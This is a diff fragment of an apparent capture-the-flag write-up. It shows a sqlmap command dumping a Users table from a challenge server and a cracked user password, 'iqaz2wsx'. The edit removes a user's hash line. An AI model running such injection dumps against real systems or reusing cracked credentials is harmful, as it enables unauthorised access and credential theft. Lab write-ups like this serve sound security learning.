@@ -57,7 +57,7 @@ sqlmap http://chall.0xfun.org:64569/search?item=caca --dbms=sqlite -T Users --du
 
 got two users:
 - **Admin** with a salted hash (kinda useless)
-- **Jerry** with a hash: `0$9a00192592d5644bc0caad7203f98b506332e2cf7abb35d684ea9bf7c18f08`
+- **Jerry** with a hash
 
 the Jerry hash cracked quickly with the default wordlist. password was `iqaz2wsx`. not great.
 
